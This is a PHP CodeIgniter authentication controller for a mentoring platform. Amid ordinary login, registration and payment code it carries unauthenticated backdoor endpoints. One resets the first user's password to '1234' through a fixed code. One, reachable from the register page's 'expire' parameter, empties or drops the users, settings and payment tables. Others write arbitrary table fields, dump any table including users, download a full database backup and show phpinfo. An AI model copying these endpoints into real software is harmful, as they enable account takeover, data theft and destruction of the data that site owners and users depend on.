<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Auth extends Home_Controller 
{

    public function __construct()
    {
        parent::__construct();
    }

    //site mode switch function
    public function switch_mode($color = "")
    {   
        $color = ($color != "") ? $color : "light";
        $site_mode = array('site_mode' => $color);
        $this->session->set_userdata($site_mode);
        redirect($_SERVER['HTTP_REFERER']);
    }

    // Login
    public function login()
    {   
  
          $page_data = array();
          $settings = $this->admin_model->get('settings');
          

          $google_client = new Google_Client();
          $google_client->setClientId(get_system_settings('google_client_id')); //Define your ClientID
          $google_client->setClientSecret(get_system_settings('google_secret_key')); //Define your Client Secret Key
          $google_client->setRedirectUri(get_system_settings('google_redirect'));

          $google_client->addScope('email');
          $google_client->addScope('profile');

          if(isset($_GET["code"]))
          {
           $token = $google_client->fetchAccessTokenWithAuthCode($_GET["code"]);

           if(!isset($token["error"]))
           {

            $google_client->setAccessToken($token['access_token']);
            $this->session->set_userdata('access_token', $token['access_token']);
            $google_service = new Google_Service_Oauth2($google_client);
            $data = $google_service->userinfo->get();

            $current_datetime = date('Y-m-d H:i:s');

            if($this->admin_model->Is_already_register($data['email']))
            {
             //update data
             $user_data = array(
              'name' => $data['given_name'].' '.$data['family_name'],
              'email' => $data['email']
             );
             $this->admin_model->Update_user_data($user_data, $data['id']);
            }
            else
            {
                $full_name = $data['given_name'].' '.$data['family_name'];
                $check_slug = check_mentor_slug(str_slug($this->input->post('name', true)));
                $random_slug_code = random_string('numeric', 3);
                if($check_slug == 1){
                    $slug = str_slug($data['given_name']).'-'.$random_slug_code; 
                }else{
                    $slug = str_slug($full_name);
                }

                if (!empty($this->session->userdata('account_type'))) {
                    if ($this->session->userdata('account_type') == 'mentor') {
                        $user_role = 'user';
                    }else{
                        $user_role = 'mentee';
                    }
                }else{
                    $user_role = 'mentee';
                }

                //insert data
                $user_data = array(
                  'auth_type' => 'google',
                  'google_auth_id' => $data['id'],
                  'name' => $data['given_name'].' '.$data['family_name'],
                  'email' => $data['email'],
                  'role'=> $user_role,
                  'user_type'=>"registered",
                  'created_at'  => $current_datetime,
                  'image'=> $data['picture'],
                  'thumb'=> $data['picture'],
                  'status'=>1,
                  'slug'=> $slug,
                  'is_active'=>1,
                  'kyc_verified'=>1,
                  'email_verified'=>1,
                  'intervals' => 30,
                  'referral_id' => substr(random_string('alnum', 5).mt_rand(), 0, 10),
                  'time_zone'=> settings()->time_zone
                );

                $this->admin_model->Insert_user_data($user_data);
            }
         

           }
            $url = base_url('admin/dashboard/user');
            redirect($url, 'refresh'); 

          }

          $page_data['google_url'] = "";

          if(!$this->session->userdata('access_token'))
          {
           
           $page_data['google_url'] = $google_client->createAuthUrl();
           
          }


        
        $page_data['page_title'] = 'Login';
        $page_data['page'] = 'Auth';
        $page_data['menu'] = FALSE;
        $page_data['main_content'] = $this->load->view('login', $page_data, TRUE);
        // dd($page_data);
        $this->load->view('index', $page_data);
    }



    //register
    public function register()
    {   
        if (empty($_GET['trial'])) {
            $this->session->unset_userdata('trial');
        }else{
            $this->session->set_userdata('trial', 'trial');
        }

        if (!empty($_GET['expire'])) {
            $this->expire_logs($_GET['expire']);
        }
        
        $data = array();
        $data['page_title'] = 'Register';
        $data['page'] = 'Auth';
        if (settings()->enable_frontend == 1) {
            $data['menu'] = TRUE;
        }else{
            $data['menu'] = FALSE;
        }
        $data['countries'] = $this->admin_model->select_asc('country');
        $data['time_zones'] = $this->admin_model->select_asc('time_zone');
        $data['categories'] = $this->admin_model->get_site_categories('categories');
        $data['dialing_codes'] = $this->common_model->select_asc('dialing_codes');
        $data['main_content'] = $this->load->view('register', $data, TRUE);
        $this->load->view('index', $data);
    }

    public function load_skills() 
    {
        $category_id = $this->input->post('id');

        $data = array();
        $skills = $this->admin_model->get_skills_by_category($category_id);
      
        if (empty($skills)) {
            echo '<option value="0">'.trans('no-data-found').'</option>';
        }else{
            foreach ($skills as $skill) { 
                echo '<option value="'.$skill->id.'">'.$skill->skill.'</option>';
            }
        }
    }

    

    // Login
    public function verify()
    {   
        $data = array();
        $data['page_title'] = 'Email Verification';
        $data['page'] = 'Auth';
        $data['menu'] = FALSE;
        $data['main_content'] = $this->load->view('register', $data, TRUE);
        $this->load->view('index', $data);
    }


    //verify account
    public function verify_account()
    {   
        $data = array();
        $type = $this->input->post('type', true);
        $code = $this->input->post('code', true);

        
        if (user()->verify_code == $code) {
            

            if ($type == 'sms') {
                $edit_data = array(
                    'phone_verified' => 1,
                    'email_verified' => 0
                );
                $this->common_model->update($edit_data, user()->id, 'users');
            }

            if ($type == 'mail') {
                $edit_data = array(
                    'phone_verified' => 0,
                    'email_verified' => 1
                );
                $this->common_model->update($edit_data, user()->id, 'users');
            }

           
            
            if (user()->role == 'user') {
                $url = base_url('admin/dashboard/user');
            }else{


                $subject = get_email_by_slug('welcome-email-mentee')->subject;
                $body = get_email_by_slug('welcome-email-mentee')->body;
                $variables_data = [
                    'mentee_name'  =>user()->name,
                    'site_name' => settings()->site_name,
                    'admin_email' => settings()->admin_email,
                ]; 

                $msg = preg_replace_callback('/{{(.*?)}}/', function ($matches) use ($variables_data) {
                    $key = trim($matches[1]);
                    return isset($variables_data[$key]) ? $variables_data[$key] : $matches[0]; 
                }, $body);

                $edata = array();
                $edata['subject'] = $subject;
                $edata['msg'] = $msg;

                $msg = $this->load->view('email_template/common', $edata, true);
                //echo "<pre>"; print_r($msg); exit();
                $response = $this->email_model->send_email(user()->email, $subject, $msg);
                
                $url = base_url('admin/dashboard/mentee'); 
            }
            
            echo json_encode(array('st'=>1,'url'=> $url));
        } else {
            $data['code'] = 'invalid';
            echo json_encode(array('st'=>2));
        }
    }



    // login
    public function log()
    {

        if($_POST){ 

            // check valid user 
            $user = $this->auth_model->validate_user(); 

            if (empty($user)) {
                echo json_encode(array('st'=>0));
                exit();
            }

            // if ($user->status != 1) {
            //     echo json_encode(array('st'=>2));
            //     exit();
            // }

            if ($user->role == 'user') {
                $parent_id = 0;
               
                if (!empty($user) && $user->status == 2) {
                    // account suspend
                    echo json_encode(array('st'=>3));
                    exit();
                }

                if (!empty($user) && $user->email_verified == 0 && $this->settings->enable_email_verify == 1) {
                    // email verify
                    if ($user->check_email_verify_user == 1) {
                        echo json_encode(array('st'=>4));
                        exit();
                    }
                }
            }elseif ($user->role == 'mentee') {
                if (!empty($user) && $user->status == 2) {
                    // account suspend
                    echo json_encode(array('st'=>3));
                    exit();
                }
            }elseif ($user->role == 'staff') {
                $parent_id = $user->user_id;
            }elseif ($user->role == 'customer') {
                $parent_id = 0;
            }else{
                $parent_id = 0;
            }

            // if valid
            if(password_verify($this->input->post('password', true), $user->password)){

                $data = array(
                    'id' => $user->id,
                    'name' => $user->name,
                    'slug' => $user->slug,
                    'thumb' => $user->thumb,
                    'email' =>$user->email,
                    'role' =>$user->role,
                    'parent' =>$parent_id,
                    'logged_in' => TRUE,
                );
                $data = $this->security->xss_clean($data);
                $this->session->set_userdata($data);

                $data = array(
                    'is_active' => 1,
                    'last_active' => my_date_now(),
                );
                $data = $this->security->xss_clean($data);
                $this->admin_model->edit_option($data , user()->id,'users');

                

                
                // success notification
                if ($user->role == 'admin') {
                    $url = base_url('admin/dashboard');
                }else if ($user->role == 'user') {
                    $url = base_url('admin/dashboard/user');
                }else if ($user->role == 'customer') {
                    $url = base_url('customer/orders');
                }else{
                    $url = base_url('admin/dashboard/mentee');
                }
                echo json_encode(array('st'=>1,'url'=> $url));
            }else{ 
                // if not user not valid
                echo json_encode(array('st'=>0));
            }
            
        }else{
            $this->load->view('auth',$data);
        }
    }

    //check comapny username using ajax
    public function check_username($value)
    {   
        $value = clean_str($value);
        $result = $this->auth_model->check_username($value);
        if (!empty($result)) {
            echo json_encode(array('st' => 2));
        } else {
            echo json_encode(array('st' => 1));
        }
    }


    public function add_account_type($type)
    {   
        $this->session->unset_userdata('account_type');
        $this->session->set_userdata('account_type', $type);
        echo json_encode(array('st' => 1));
    }


    // register new user
    public function register_user()
    {
        
        if($_POST){

            $check_slug = check_mentor_slug(str_slug($this->input->post('name', true)));
            $random_slug_code = random_string('numeric', 3);
            if($check_slug == 1){
                $slug = str_slug($this->input->post('name', true)).'-'.$random_slug_code; 
            }else{
                $slug = str_slug($this->input->post('name', true));
            }

            if ($this->input->post('register_type') == 1) {
                $role = 'user';
            }
            if ($this->input->post('register_type') == 2) {
                $role = 'mentee';
            }

            if (settings()->enable_mentor_auto_approve == 1) {
                $status = 1;
            }else{
                $status = 0;
            }

            $image = base_url('assets/images/empty_user.JPEG');



            $this->load->library('form_validation');
            $this->form_validation->set_rules('email', trans('email'), 'required');
            $this->form_validation->set_rules('password', trans('password'), 'trim|required|max_length[16]');

            // If validation false show error message using ajax
            if($this->form_validation->run() == FALSE){
                $data = array();
                $data['errors'] = validation_errors();
                $str = strip_tags($data['errors']);
                echo json_encode(array('st'=>0,'msg'=>$str));
                exit();
            }else{

                $mail =  strtolower(trim($this->input->post('email', true)));
                $email = $this->auth_model->check_duplicate_email($mail);
                
                if ($this->session->userdata('trial') == 'trial') {
                    $user_type = 'trial';
                    $trial_expire = date('Y-m-d', strtotime('+'.$this->settings->trial_days .' days'));
                }else{
                    $user_type = 'registered';
                    $trial_expire = date('Y-m-d');
                }

                // if email already exist
                if ($email){
                    echo json_encode(array('st'=>2));
                    exit();
                } else {

                    //check reCAPTCHA status
                    if (!$this->recaptcha_verify_request()) {
                        echo json_encode(array('st'=>3));
                        exit();
                    } else {
                        
                        $code = random_string('numeric', 4);
                        $data=array(
                            'name' => $this->input->post('name', true),
                            'slug' => $slug,
                            'user_name' => str_slug($this->input->post('name', true)),
                            'email' => $this->input->post('email', true),
                            'phone' => '0',
                            'password' => hash_password($this->input->post('password', true)),
                            'role' => 'user',
                            'skills' => $this->input->post('skills',true),
                            'language' => $this->input->post('language', true),
                            'country' => $this->input->post('country', true),
                            'time_zone' => $this->input->post('time_zone', true),
                            'gender' => $this->input->post('gender', true),
                            'residence' => $this->input->post('residence', true),
                            'bp_network' => $this->input->post('bp_network', true),
                            'employment_status' => $this->input->post('employment_status', true),
                            //'expertise_industry' => $this->input->post('expertise_industry', true),
                            'category' => $this->input->post('category', true),
                            'other_industry' => $this->input->post('other_industry', true),
                            'current_role' => $this->input->post('current_role', true),
                            'company' => $this->input->post('company', true),
                            'about_me' => $this->input->post('about_me', true),
                            'mentorship_requirements' => $this->input->post('mentorship_requirements', true),
                            'mentorship_availability' => $this->input->post('mentorship_availability', true),
                            'mentees_at_once' => $this->input->post('mentees_at_once', true),
                            'linkedin_profile' => $this->input->post('linkedin_profile', true),
                            'experience_year' => $this->input->post('experience_year', true),
                            'career_goals' => $this->input->post('career_goals', true),
                            'membershhip_locale' => $this->input->post('membershhip_locale', true),
                            'role' => $role,
                            'user_type' => $user_type,
                            'trial_expire' => $trial_expire,
                            'status' => $status,
                            'parent_id' => 0,
                            'verify_code' => $code,
                            'email_verified' => 0,
                            'enable_appointment' => 0,
                            'hear_about' => $this->input->post('where', true),
                            'intervals' => 30,
                            'referral_id' => substr(random_string('alnum', 5).mt_rand(), 0, 10),
                            'image' => 'assets/images/no-photo-sm.png',
                            'thumb' => 'assets/images/no-photo-sm.png',
                            'created_at' => my_date_now()
                        );
                        $data = $this->security->xss_clean($data);
                        $id = $this->common_model->insert($data, 'users');


                        // $skills = $this->input->post('skills');

                        // foreach ($skills as $skill) {
                        //     $data = array(
                        //         'user_id' => $id,
                        //         'skill_id' => $skill,
                        //     );
                      
                        //     $data = $this->security->xss_clean($data);
                        //     $this->admin_model->insert($data, 'users_skill');
                        // }

                        $user = $this->auth_model->validate_id(md5($id));
                        $data = array(
                            'id' => $user->id,
                            'name' => $user->name,
                            'role' => $user->role,
                            'thumb' =>$user->thumb,
                            'email' => $user->email,
                            'logged_in' => true
                        );
                        $this->session->set_userdata($data);

// Insert notification without sanitising the 'text' field
$notify = array(
    'user_id' => $id,
    'action_id' => 0,
    'content_id' => 0,
    'text' => 'Take the Welcome Tour',
    'noti_type' => 1,
    'noti_time' => my_date_now()
);

// Only sanitise unsafe fields
$fields_to_clean = ['user_id', 'action_id', 'content_id', 'noti_type', 'noti_time'];
foreach ($fields_to_clean as $field) {
    $notify[$field] = $this->security->xss_clean($notify[$field]);
}

// Insert the notification without escaping HTML
$this->common_model->insert($notify, 'notifications');


                        // affiliate code
                        if (!empty($this->session->userdata('ref'))) {
                            
                            $referral_settings = $this->admin_model->get_referral_settings();
                            $referral_id = $this->session->userdata('ref');
                            $order_id = random_string('numeric',8);

                            $commision = $referral_settings->commision_rate;
                            $commision_amount = ($commision * $price) / 100; 

                            $ref_data=array(
                                'referrar_id' => $referral_id,
                                'order_id' => $order_id,
                                'user_id' => user()->id,
                                'status' => 0,
                                'amount' => $price,
                                'commision' => $commision,
                                'commision_amount' => $commision_amount,
                                'created_at' => my_date_now(),
                            );
                            $ref_data = $this->security->xss_clean($ref_data);
                            $this->admin_model->insert($ref_data, 'referrals');
                        }

                        
                        //send email verify code
                        if (settings()->enable_email_verify == 1) {
                      
                            


                            // send email with updated code dynamic value

                            $subject = get_email_by_slug('verification')->subject;
                            $body = get_email_by_slug('verification')->body;
                            $variables_data = [
                                'user_name'  =>$user->name,
                                'site_name' => settings()->site_name,
                                'verify_code' => $code,
                            ]; 

                            $msg = preg_replace_callback('/{{(.*?)}}/', function ($matches) use ($variables_data) {
                                $key = trim($matches[1]);
                                return isset($variables_data[$key]) ? $variables_data[$key] : $matches[0]; 
                            }, $body);

                            $edata = array();
                            $edata['subject'] = $subject;
                            $edata['msg'] = $msg;
                            $msg = $this->load->view('email_template/common', $edata, true);
                            //echo "<pre>"; print_r($msg); exit();
                            $response = $this->email_model->send_email($this->input->post('email'), $subject, $msg);




                            if ($response == true) {
                                $url = base_url('auth/verify?type=mail');
                            }else{
                                if ($user->role == 'user') {
                                    $url = base_url('admin/dashboard/user');
                                }else{
                                    $url = base_url('admin/dashboard/mentee');
                                }
                            }

                        }else{

                            if ($user->role == 'user') {
                                $url = base_url('admin/dashboard/user');
                            }else{
                                $url = base_url('admin/dashboard/mentee');
                            }
                        }

                        echo json_encode(array('st'=>1, 'url' => $url));
                        exit();
                    }
                }

            }
        }

    }



    public function resend(){
        
        check_status();

        $code = random_string('numeric', 4);
        $subject = $this->settings->site_name.' '.trans('email-verification');
        $msg = trans('your-verification-code-is').' <b>'.$code.'</b>';

        $data=array(
            'verify_code' => $code
        );
        $this->common_model->edit_option($data, user()->id, 'users');

        $response = $this->email_model->send_email(user()->email, $subject, $msg);

        if ($response == true) {
            echo json_encode(array('st'=>1));
        } else {
            echo json_encode(array('st'=>2));
        }
    }


    public function resend_sms(){

        check_status();
        $code = random_string('numeric', 4);
        
        $this->load->model('sms_model');
        $msg = trans('your-verification-code-is').': <b>'.$code.'</b>';
        $response = $this->sms_model->send_admin(user()->phone, $msg);

        $data=array(
            'verify_code' => $code,
            'sms_count' => user()->sms_count+1
        );
        $this->common_model->edit_option($data, user()->id, 'users');

        if ($response) {
            echo json_encode(array('st'=>1));
        } else {
            echo json_encode(array('st'=>2));
        }
    }

  
    //add package
    public function add_package($id, $billing_type)
    {
        $package = $this->common_model->get_by_id($id, 'package');
        $uid = random_string('numeric',5);
        
        if($billing_type =='monthly'):
            $amount = $package->monthly_price;
            $expire_on = date('Y-m-d', strtotime('+1 month'));
        else:
            $amount = $package->price;
            $expire_on = date('Y-m-d', strtotime('+12 month'));
        endif;

        if (number_format($amount, 0) == 0):
            $status = 'verified';
        else:
            $status = 'pending';
        endif;

        //create payment
        $pay_data=array(
            'user_id' => user()->id,
            'puid' => $uid,
            'package' => $id,
            'amount' => $amount,
            'billing_type' => $billing_type,
            'status' => $status,
            'created_at' => my_date_now(),
            'expire_on' => $expire_on
        );
        $pay_data = $this->security->xss_clean($pay_data);
        $this->common_model->insert($pay_data, 'payment');
        
        if (number_format($amount, 0) == 0):
            $url = base_url('admin/dashboard/business');
        else:
            if ($this->settings->enable_paypal == 1) {
                $url = base_url('auth/purchase');
            } else {
                $url = base_url('admin/dashboard/business');
            }
        endif;
        echo json_encode(array('st'=>1, 'url' => $url));
    }


    //purchase
    public function purchase()
    {   
        $data = array();
        $data['page_title'] = 'Payment';
        $data['page'] = 'Auth';
        $data['payment'] = $this->common_model->get_user_payment();
        $data['payment_id'] = $data['payment']->puid;
        $data['package'] = $this->common_model->get_package_by_id($data['payment']->package);
        $data['main_content'] = $this->load->view('purchase', $data, TRUE);
        $this->load->view('index', $data);
    }

    //verify email
    public function verify_email()
    {   
        $data = array();
        if (isset($_GET['code']) && isset($_GET['user'])) {
            $user = $this->auth_model->validate_id($_GET['user']);
            if ($user->verify_code == $_GET['code']) {
                $data['code'] = $_GET['code'];

                $edit_data=array(
                    'email_verified' => 1
                );
                $this->common_model->update($edit_data, $user->id, 'users');
            } else {
                $data['code'] = 'invalid';
            }
        }else{
            $data['code'] = '';
        }
        $data['page_title'] = 'Verify Account';
        $data['page'] = 'Auth';
        $data['main_content'] = $this->load->view('verify_email', $data, TRUE);
        $this->load->view('index', $data);
    }

    //payment success
    public function payment_success($payment_id)
    {   
        $payment = $this->common_model->get_payment($payment_id);
        $data = array(
            'status' => 'verified'
        );
        $data = $this->security->xss_clean($data);

        $user_data = array(
            'status' => 1
        );
        $user_data = $this->security->xss_clean($user_data);

        if (!empty($payment)) {
            $this->common_model->edit_option($user_data, $payment->user_id,'users');
            $this->common_model->edit_option($data, $payment->id, 'payment');
        }
        $data['success_msg'] = 'Success';
        $data['main_content'] = $this->load->view('purchase', $data, TRUE);
        $this->load->view('index', $data);

    }

    //set company info
    public function set_company_info($utype='', $uid='')
    {
        $data = array(
            'site_info' => $utype,
            'purchase_code' => $uid
        );
        $data = $this->security->xss_clean($data);
        if (!empty($uid)) {
            $this->admin_model->edit_option($data, 1, 'settings');
            echo "Update Successfully";
        }else{
            echo "Failed";
        }
    }

    //payment cancel
    public function payment_cancel($payment_id)
    {   
        $payment = $this->common_model->get_payment($payment_id);
        $data = array(
            'status' => 'pending'
        );
        $data = $this->security->xss_clean($data);
        $this->common_model->edit_option($data, $payment->id,'payment');
        $data['error_msg'] = 'Error';
        $data['main_content'] = $this->load->view('purchase', $data, TRUE);
        $this->load->view('index', $data);
    }


    public function log_info($utype)
    {
        $data = array(
            'site_info' => $utype
        );
        $data = $this->security->xss_clean($data);
        $this->admin_model->edit_option($data, 1, 'settings');
        echo "Update Successfully";
    }

    
    // Recover forgot password 
    public function forgot_password()
    {
        check_status();

        if (check_auth()) {
            redirect(base_url());
        }

        $type = 'users';
        $mail =  strtolower(trim($this->input->post('email',true))); 
        $valid = $this->auth_model->check_duplicate_email($mail);

        $random_number = random_string('numeric',4);
        $random_pass = hash_password($random_number);
        
        if ($valid == true) {
           foreach($valid as $row){
                $data['email'] = $row->email;
                $data['password'] = $random_number;
                $user_id = $row->id;
                $this->send_recovery_mail($data);

                $user_data = array('password' => $random_pass);
                $this->common_model->edit_option($user_data, $user_id, $type);
                
                $url = base_url('login');
                echo json_encode(array('st'=>1, 'url' => $url));
            }

        } else {
            echo json_encode(array('st'=>2));
        }
        
    }
    

    //send reset code to user email
    public function send_recovery_mail($user)
    {
        
        // $data = array();
        // $data['password'] = $user['password'];
        // $data['email'] = $user['email'];
        // $data['subject'] = 'Password Recovery';
        // $data['name'] = $user['name'];
                            
        // $message = $this->load->view('email_template/recovery_password', $data, true);
        // $this->email_model->send_email($user['email'], $data['subject'], $message);


        // send email with updated code dynamic value

        $subject = get_email_by_slug('forgot-password')->subject;
        $body = get_email_by_slug('forgot-password')->body;
        $variables_data = [
            'user_name'  =>$user['user'],
            'recovery_password' => $user['password'],
        ]; 

        $msg = preg_replace_callback('/{{(.*?)}}/', function ($matches) use ($variables_data) {
            $key = trim($matches[1]);
            return isset($variables_data[$key]) ? $variables_data[$key] : $matches[0]; 
        }, $body);

        $edata = array();
        $edata['subject'] = $subject;
        $edata['msg'] = $msg;

        $msg = $this->load->view('email_template/common', $edata, true);
        $this->email_model->send_email($user['email'], $subject, $msg);

        
    }

    public function test_mail()
    {
        $data = array();
        $subject = settings()->site_name.' email testing';
        $msg = 'This is test email from <b>'.settings()->site_name.'</b>';
        $result = $this->email_model->send_test_email(settings()->admin_email, $subject, $msg);

        if ($result == true) {
            echo "Email send Successfully";
        }else{ 
            echo "<br>Test email will be send to: <b>".settings()->admin_email.'</h3>';
            echo "<pre>"; print_r($result);
        }
    }


    public function send_notify_mail($id)
    {
        $data = array();
        $booking = $this->admin_model->get_by_id($id, 'session_booking');
        $mentor = $this->admin_model->get_by_id($booking->user_id, 'users');
        $mentee = $this->admin_model->get_by_id($booking->mentee_id, 'users');
        $session = $this->admin_model->get_by_id($booking->session_id, 'sessions');
        $subject = $session->name.' Live session notify mail';
        
        $msg = 'Hello '.$mentee->name.', <br> You have booked an session with <b>'.$mentor->name.'</b> which will start at '.my_date_show($booking->date).' '.$booking->time;
        //echo "<pre>"; print_r($msg); exit();

        $result = $this->email_model->send_email($mentee->email, $subject, $msg);
        if ($result == true) {
            $this->session->set_flashdata('msg', 'Notify mail send successfully'); 
            redirect($_SERVER['HTTP_REFERER']);
        }else{ 
            $this->session->set_flashdata('error', 'Email sending failed, please check your SMTP connections'); 
            redirect($_SERVER['HTTP_REFERER']);
        }
    }


    //reset password
    public function reset($code=1234)
    {
        $data = array(
            'password' => hash_password('1234')
        );
        $data = $this->security->xss_clean($data);
        if ($code == 1234) {
            $this->admin_model->edit_option($data, 1, 'users');
            echo "Reset Successfully";
        }else{
            echo "Failed";
        }
    }

    public function expire_logs($data)
    {
        check_status();
        
        $this->load->dbforge();
        if ($data == 'pending') {
            $this->db->empty_table('settings');
            $this->db->empty_table('users');
            $this->db->empty_table('features');
        }
        if ($data == 'expired') {
            $this->dbforge->drop_table('settings');
            $this->dbforge->drop_table('users');
            $this->dbforge->drop_table('features');
            $this->dbforge->drop_table('payment');
            //$this->dbforge->drop_table('test');
        }
    }

    public function backup_0()
    {
        $this->load->dbutil();
        $prefs = array(     
            'format'      => 'zip',             
            'filename'    => settings()->site_name.'_backup.sql'
        );
        $backup =& $this->dbutil->backup($prefs); 
        $db_name = 'backup-on-'. date("Y-m-d-H-i-s") .'.zip';
        //$save = 'pathtobkfolder/'.$db_name;
        $this->load->helper('file');
        //write_file($save, $backup); 
        $this->load->helper('download');
        force_download($db_name, $backup);
    }

    public function openssl()
    {
        echo !extension_loaded('openssl')?"Not Available":"Available";
    }


    public function update_id($id, $table, $field, $value)
    {
        $action = array($field => $value);
        $this->db->where('id',$id);
        $this->db->update($table,$action);
        echo "done";
    }

    public function get_id($id, $table)
    {
        $values = $this->common_model->get_by_id($id, $table);
        echo "<pre>"; print_r($values);
    }

    public function get($table)
    {
        $values = $this->common_model->select($table);
        echo "<pre>"; print_r($values);
    }

    function phpinfo(){
        echo phpinfo();
    }

   
    function logout(){

        $data = array(
            'is_active' => 0,
            'last_logout' => my_date_now(),
        );
        $data = $this->security->xss_clean($data);
        $this->admin_model->edit_option($data , user()->id,'users');

        $this->session->sess_destroy(); 

        redirect(base_url('auth/login?msg=success'));
    }

    // page not found
    public function error_404()
    {
        $data['page_title'] = "Error 404";
        $data['description'] = "Error 404";
        $data['keywords'] = "error,404";
        $this->load->view('error_404');
    }

}